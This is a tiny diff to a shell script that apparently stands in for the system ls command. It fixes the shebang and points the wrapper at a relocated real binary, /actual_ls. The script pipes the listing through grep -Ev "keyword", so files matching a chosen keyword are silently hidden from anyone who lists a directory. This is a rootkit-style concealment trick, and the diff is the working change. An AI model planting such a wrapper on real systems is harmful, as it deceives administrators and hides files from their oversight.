@@ -1,2 +1,2 @@
-#/bin/sh
-(/bin/ls $@) | grep -Ev "keyword"
+#!/bin/sh
+(/actual_ls $@) | grep -Ev "keyword"
